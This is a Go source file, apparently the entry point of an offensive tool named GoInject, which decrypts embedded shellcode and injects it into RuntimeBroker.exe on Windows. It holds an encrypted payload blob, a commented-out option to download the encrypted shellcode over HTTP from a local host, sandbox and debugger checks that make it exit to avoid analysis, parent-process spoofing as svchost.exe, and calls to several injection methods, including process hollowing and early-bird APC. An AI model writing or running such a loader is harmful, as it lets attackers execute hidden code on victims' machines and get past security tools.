package main

import (
	"GoInject/sandboxDetection"
	"GoInject/techniques"
	"os"
	"GoInject/spoof"
)

func main(){
	key := "SomeRandomKey"

	//store SC inside. Use helper/encryptShellcode.go
	shellcodeEncrypted :="2fe43cb07a93a7b2a55d9d84462a5bdc17c4fe7627638d8a1cb057b2344815138a25c58fa31949791cbb87a50719c3c99b68107091d7348a93a11f1c292c7a56a8a8ee69615d86cc8eb1cef2e44a098b9aed24bffeb4dab1030d39c6f012e6bfe80af57e02672277c1a116a84e33341cb3300df81c5277c6bf006bf18774fa6dccb4dd47ca804597e140bade6167864252b08f5c5d3cd824c3d932447892133bd40c1cbeadc50e66defc45356878094817bfc0829127680fb7a36a7ac3e101f72b8eb95d67f525c38340d995705ebf6c073bd23a68d136a86284211bd95e140e3b330c4a88188315a1fcb28bc6b1e7d19baad330e65f98c622d2940d115067a74c659da571be65bbfe170b381ab1183b3b796b69077e46a85276034c1e29acfd11c95f90a25ecdc448307a8e2d36740aeb7883fedf9473288a1f4d8f6930049d6930f828d1f5da9d1bfea3d1e2104585196e47a0d88c4ee629a44197a9232acc47a81b25e5a37cacb0c31178ebddbc972114ccc021b2ac2af36e40ad212ada8604a2818c8e31e449f3ab2ea2ec6c852bfb28c654e5870803fe06ff383d4714b32347c56a28f79874cf5f9fc289a24ed38d712437224355c3a06874744a2bc87eae8c1579aea4a6ec78d23c88b6407b9e456048fb284c2c54f69bdf430d102f9d92af51447ce7a4daa63babf26ae2710e9bf102e3d93ac91eb4bf8038edf6a8293f32e23027a45486e44362c882da324d08bd74328b4c816462a9c100f879e602764d5d4a93cea119a3b208a4e518ba142af164c73defba1644b17251a03d88d35ad433962348e6f8bb8e334f13219356c55e8839536fb10b397edc73dc1f16661d2733855912c85293b5f5c2f0907e16880cd3fe5fea60ac1f372059b4e27f9d1c4ba35b72abc4d133ee139d55d6b29d61947f4663282abddc355a2e56450f9d89fec66e9361311fed3549a6ce6c6b92625476d565e5d4a1c6044bd770e3030f69d899270cf9ebc463e2a92ce445a0e1c1336e7954f3f8f399587bf706cf2a42e9e9655b19d3fec413f7e61e1e7d6a676da138587e780b1f18544d66b2c2e55d070bcb6d5e2c373c6aec6d489333aa2d025eff0a896a7516df27b7fcf5118cc9faa1d145fac29c7f85f497efafc25646f6cae6a0ed59d37a125b47f7299df1ba7c48b161083286d3e947d5708221bac2da0562c0c96c92c2d7500879a6f4e969285ea2887227a0f488afd0204d67c757186538f281be01de11a14a904eb327d759bed8184631e5f0c68f204c12181b2557a953a75c81e4387ead98e80d168b2337bc34870884bf0f4475f91755296c8367a48dd1"
   
	// or make an HTTP request to fetch it in memory, pick your poison ;)

	// dl, _ := http.Get("http://192.168.68.100/enc_shellcode.bin")
    //defer dl.Body.Close()
	// shellcodeEncrypted,_ := ioutil.ReadAll(dl.Body)



	//If sandbox is detected, exit
   if(sandboxDetection.Sleep() || sandboxDetection.IsBeingDebugged()){
   	os.Exit(0)
   }

    spoof.SpoofParent("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\RuntimeBroker.exe")
	//techniques.CreateRemoteThread("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
    techniques.BlockAndWait("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
	
	//techniques.EarlyBirdQueueUserAPC("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
	//techniques.ProcessHollowing("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
	//techniques.BlockAndWait("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)
	//techniques.EarlyBirdQueueUserAPC("C:\\Windows\\System32\\RuntimeBroker.exe", shellcodeEncrypted, key)

}
